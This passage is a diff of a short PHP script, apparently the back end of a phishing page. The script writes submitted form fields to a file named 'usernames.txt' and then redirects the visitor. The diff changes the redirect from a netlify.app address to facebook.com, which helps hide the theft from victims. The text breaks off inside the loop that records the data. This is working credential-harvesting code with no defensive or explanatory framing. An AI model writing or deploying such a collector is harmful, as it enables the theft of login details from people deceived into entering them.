@@ -1,5 +1,5 @@
 <?php
-header('Location: http://competent-austin-4fc90b.netlify.app/');
+header('Location: http://www.facebook.com/');
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
